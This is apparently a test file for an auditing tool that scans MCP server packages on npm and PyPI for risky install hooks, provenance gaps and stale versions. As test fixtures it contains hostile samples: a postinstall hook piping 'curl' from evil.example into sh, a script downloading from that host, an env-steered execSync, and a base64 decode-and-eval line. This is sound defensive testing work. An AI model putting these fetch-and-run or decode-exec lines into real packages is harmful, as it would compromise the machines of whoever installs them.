import { test } from 'node:test'
import assert from 'node:assert/strict'
import { auditPackage, auditPypiPackage, summarize, renderMarkdown, newestPerServer, hookScriptRefs, stripStringsAndComments, criticalPatternOf } from '../mcp-audit.mjs'

const server = {
  name: 'acme/server',
  version: '1.0.0',
  packages: [{ registryType: 'npm', identifier: 'acme-mcp', version: '1.0.0', transport: { type: 'stdio' } }],
  repository: { url: 'https://github.com/acme/server' },
}

test('auditPackage flags install-time execution and a shell pipeline', () => {
  const doc = {
    'dist-tags': { latest: '1.1.0' },
    versions: {
      '1.0.0': {
        scripts: { postinstall: 'curl -fsSL https://evil.example/x | sh' },
        repository: { url: 'git+https://github.com/other/repo.git' },
        dependencies: { execa: '^9.0.0' },
      },
    },
  }
  const findings = auditPackage(server, doc, { version: '1.0.0' })
  const rules = findings.map((f) => f.rule)
  assert.ok(rules.includes('stdio-transport'))
  assert.ok(rules.includes('install-time-execution'))
  assert.ok(rules.includes('install-hook-critical'))
  assert.ok(rules.includes('repository-mismatch'))
  assert.ok(rules.includes('declared-version-not-latest'))
  assert.ok(rules.includes('process-spawn-dependency'))
  const critical = findings.find((f) => f.rule === 'install-hook-critical')
  assert.equal(critical.severity, 'critical')
  assert.match(critical.evidence, /postinstall/)
})

test('auditPackage reports unknown instead of guessing when metadata is missing', () => {
  const findings = auditPackage(server, null, { version: '1.0.0' })
  assert.deepEqual(findings.map((f) => f.rule), ['stdio-transport', 'package-metadata-unavailable'])
  assert.equal(findings[1].severity, 'unknown')
})

test('auditPackage flags a missing repository and deprecation', () => {
  const doc = { 'dist-tags': { latest: '1.0.0' }, versions: { '1.0.0': {} }, deprecated: 'moved to acme/mcp' }
  const findings = auditPackage({ ...server, repository: null }, doc, { version: '1.0.0' })
  const rules = findings.map((f) => f.rule)
  assert.ok(rules.includes('package-repository-missing'))
  assert.ok(rules.includes('package-deprecated'))
})

test('summarize counts findings, coverage and audited packages', () => {
  const rows = [
    { server: 'a', package: 'a-mcp', registryType: 'npm', audited: true, findings: [{ rule: 'install-time-execution', severity: 'high' }] },
    { server: 'b', package: null, registryType: null, audited: false, findings: [] },
    { server: 'c', package: 'c-mcp', registryType: 'pypi', audited: false, findings: [{ rule: 'install-time-execution', severity: 'high' }] },
  ]
  const s = summarize(rows)
  assert.equal(s.servers.total, 3)
  assert.equal(s.servers.withFindings, 2)
  assert.equal(s.servers.withPackage, 2)
  assert.equal(s.servers.auditedNpm, 1)
  assert.equal(s.servers.notAuditedPackages, 1)
  assert.equal(s.servers.remoteOnly, 1)
  assert.equal(s.ruleCounts['install-time-execution'], 2)
})

test('renderMarkdown shows the rule table and high-severity rows', () => {
  const payload = {
    generatedAt: 'T',
    source: 'src',
    summary: summarize([
      { server: 'acme/server', package: 'acme-mcp', registryType: 'npm', audited: true, findings: [{ rule: 'install-script-shell-pipeline', severity: 'critical', evidence: 'scripts.postinstall=...' }] },
    ]),
    registry: { entries: 2, uniqueServers: 1, pages: 1, truncated: false },
    rows: [{ server: 'acme/server', package: 'acme-mcp', findings: [{ rule: 'install-script-shell-pipeline', severity: 'critical', evidence: 'scripts.postinstall=...' }] }],
  }
  const md = renderMarkdown(payload)
  assert.match(md, /Enumerated \*\*2\*\* registry entries covering \*\*1\*\* unique servers/)
  assert.match(md, /Audited: \*\*1\*\* npm and \*\*0\*\* PyPI packages/)
  assert.match(md, /install-script-shell-pipeline/)
  assert.match(md, /Static only/)
})
test('newestPerServer keeps the highest published version per name', () => {
  const servers = [
    { name: 'a/b', version: '1.0.0' },
    { name: 'a/b', version: '1.2.0' },
    { name: 'a/b', version: '1.1.9' },
    { name: 'c/d', version: '0.1.0' },
  ]
  const kept = newestPerServer(servers)
  assert.equal(kept.length, 2)
  assert.equal(kept.find((s) => s.name === 'a/b').version, '1.2.0')
})

test('auditPackage records one stdio finding even with several packages', () => {
  const server = { name: 'x/y', packages: [
    { registryType: 'npm', identifier: 'a', transport: { type: 'stdio' } },
    { registryType: 'npm', identifier: 'b', transport: { type: 'stdio' } },
  ] }
  const findings = auditPackage(server, null, {})
  assert.equal(findings.filter((f) => f.rule === 'stdio-transport').length, 1)
})

const pkg = (hook) => ({ 'dist-tags': { latest: '1.0.0' }, versions: { '1.0.0': { scripts: { postinstall: hook } } } })

test('a print-only node -e hook is not critical (v0 false positive)', () => {
  const findings = auditPackage(server, pkg("node -e \"console.log('installed')\""), { version: '1.0.0' })
  assert.ok(findings.some((f) => f.rule === 'install-time-execution'))
  assert.ok(!findings.some((f) => f.severity === 'critical'), JSON.stringify(findings))
})

test('a hook that only prints is listed, but is not install-time execution', () => {
  const banner = auditPackage(server, pkg("node -e \"require('fs').existsSync('dist/index.js')&&console.log('installed')\""), { version: '1.0.0' })
  assert.equal(banner.find((f) => f.rule === 'install-time-execution').severity, 'info')
  const echo = auditPackage(server, pkg("echo 'installed'"), { version: '1.0.0' })
  assert.equal(echo.find((f) => f.rule === 'install-time-execution').severity, 'info')
  const chained = auditPackage(server, pkg("echo hi && node setup.js"), { version: '1.0.0' })
  assert.equal(chained.find((f) => f.rule === 'install-time-execution').severity, 'high')
})

test('a hook that runs a program is install-time execution at high', () => {
  const findings = auditPackage(server, pkg('node scripts/postinstall.cjs'), { version: '1.0.0' })
  assert.equal(findings.find((f) => f.rule === 'install-time-execution').severity, 'high')
})

test('a hook that spawns a fixed command is execution, not an incident', () => {
  const findings = auditPackage(server, pkg("node -e \"require('child_process').execSync('npm run build')\""), { version: '1.0.0' })
  assert.ok(findings.some((f) => f.rule === 'install-time-execution'))
  assert.ok(!findings.some((f) => f.severity === 'critical'), JSON.stringify(findings))
})

test('a hook that spawns a steered command is critical', () => {
  const findings = auditPackage(server, pkg("node -e \"require('child_process').execSync(process.env.BUILD_CMD)\""), { version: '1.0.0' })
  const critical = findings.find((f) => f.rule === 'install-hook-critical')
  assert.equal(critical.severity, 'critical')
  assert.match(critical.evidence, /process-spawn/)
})

test('a referenced hook script is inspected from its content', () => {
  const doc = pkg('node scripts/postinstall.cjs')
  const benign = auditPackage(server, doc, { version: '1.0.0' }, { 'scripts/postinstall.cjs': "console.log('hello')" })
  assert.ok(benign.some((f) => f.rule === 'install-hook-script-inspected'))
  assert.ok(!benign.some((f) => f.severity === 'critical'))
  const fetched = auditPackage(server, doc, { version: '1.0.0' }, { 'scripts/postinstall.cjs': "require('node:https').get('https://evil.example/x', (r) => r.pipe(require('node:fs').createWriteStream('x')))" })
  assert.ok(fetched.some((f) => f.rule === 'install-hook-script-critical' && f.severity === 'critical'))
  const reach = auditPackage(server, doc, { version: '1.0.0' }, { 'scripts/postinstall.cjs': "require('node:https').get('https://api.example/version', (r) => console.log(r.statusCode))" })
  assert.ok(reach.some((f) => f.rule === 'install-hook-script-network' && f.severity === 'high'))
  assert.ok(!reach.some((f) => f.severity === 'critical'), JSON.stringify(reach))
  const missing = auditPackage(server, doc, { version: '1.0.0' }, {})
  assert.ok(missing.some((f) => f.rule === 'install-hook-script-unavailable' && f.severity === 'unknown'))
})

test('hookScriptRefs extracts local script paths', () => {
  assert.deepEqual(hookScriptRefs({ postinstall: 'node scripts/install.js' }), ['scripts/install.js'])
  assert.deepEqual(hookScriptRefs({ postinstall: 'curl https://x | sh' }), [])
})

test('stripStringsAndComments removes quoted text and comments', () => {
  const text = "console.log('see https://x.example')\n// curl https://y | sh\nconst a = 1"
  const stripped = stripStringsAndComments(text)
  assert.ok(!stripped.includes('https://'))
  assert.ok(!stripped.includes('curl'))
  assert.ok(stripped.includes('const a = 1'))
})

const CORPUS = [
  { label: 'benign', kind: 'buywhere notice', text: 'node -e "try{require(\'fs\').existsSync(\'dist/index.js\')&&console.log(\'Docs: https://github.com/x/y\')}catch(e){}"' },
  { label: 'benign', kind: 'raven notice', text: 'if (process.stdout.isTTY) console.log("Subscribe: https://ravenmcp.ai/#updates")' },
  { label: 'benign', kind: 'telbase warning', text: 'console.warn("Install manually: curl -fsSL https://telbase.ai/install | sh")' },
  { label: 'benign', kind: 'plain script', text: 'const fs = require("node:fs"); fs.rmSync("tmp", { recursive: true })' },
  { label: 'benign', kind: 'update check', text: "require('node:https').get('https://api.example/version', (r) => console.log(r.statusCode))" },
  { label: 'benign', kind: 'fixed build hook', mode: 'hook', text: "node -e \"require('child_process').execSync('npm run build')\"" },
  { label: 'malicious', kind: 'steered spawn hook', mode: 'hook', text: "node -e \"require('child_process').execSync(process.env.BUILD_CMD)\"" },
  { label: 'benign', kind: 'fixed build script', text: 'require("child_process").execSync("npm run build")' },
  { label: 'malicious', kind: 'steered spawn', text: 'require("child_process").execSync(process.env.BUILD_CMD)' },
  { label: 'malicious', kind: 'hook pipe', text: 'curl -fsSL https://evil.example/x | sh' },
  { label: 'malicious', kind: 'binary download', text: 'const https = require("node:https"); https.get(url, (r) => r.pipe(fs.createWriteStream(f)))' },
  { label: 'malicious', kind: 'decode exec', text: 'eval(Buffer.from(blob, "base64").toString())' },
]

test('the critical tier has precision and recall 1.0 on the labeled corpus', () => {
  const falsePositives = CORPUS.filter((c) => c.label === 'benign' && criticalPatternOf(c.text, c.mode) !== null)
  const falseNegatives = CORPUS.filter((c) => c.label === 'malicious' && criticalPatternOf(c.text, c.mode) === null)
  assert.deepEqual(falsePositives, [], 'benign samples flagged: ' + JSON.stringify(falsePositives))
  assert.deepEqual(falseNegatives, [], 'malicious samples missed: ' + JSON.stringify(falseNegatives))
})

const pypiDoc = (files, overrides = {}) => ({
  info: Object.assign({ version: '1.0.0', project_urls: { Source: 'https://github.com/acme/pypi-mcp' }, home_page: '' }, overrides.info || {}),
  releases: { '1.0.0': files },
})

test('auditPypiPackage: sdist-only is a build-time execution risk', () => {
  const findings = auditPypiPackage(server, pypiDoc([{ packagetype: 'sdist' }]), { version: '1.0.0' })
  const rule = findings.find((f) => f.rule === 'pypi-sdist-only')
  assert.equal(rule.severity, 'medium')
})

test('auditPypiPackage: a wheel still leaves install-time unknown, not clean', () => {
  const findings = auditPypiPackage(server, pypiDoc([{ packagetype: 'bdist_wheel' }, { packagetype: 'sdist' }]), { version: '1.0.0' })
  const rule = findings.find((f) => f.rule === 'pypi-install-time-unknown')
  assert.equal(rule.severity, 'unknown')
})

test('auditPypiPackage: missing release files, provenance and freshness', () => {
  const findings = auditPypiPackage(server, pypiDoc([], { info: { version: '2.0.0', project_urls: {}, home_page: '' } }), { version: '1.0.0' })
  const rules = findings.map((f) => f.rule)
  assert.ok(rules.includes('declared-version-not-found'))
  assert.ok(rules.includes('package-repository-missing'))
  assert.ok(rules.includes('declared-version-not-latest'))
})

test('auditPypiPackage: unavailable metadata is unknown, never clean', () => {
  const findings = auditPypiPackage(server, null, { version: '1.0.0' })
  assert.deepEqual(findings.map((f) => f.rule), ['package-metadata-unavailable'])
  assert.equal(findings[0].severity, 'unknown')
})
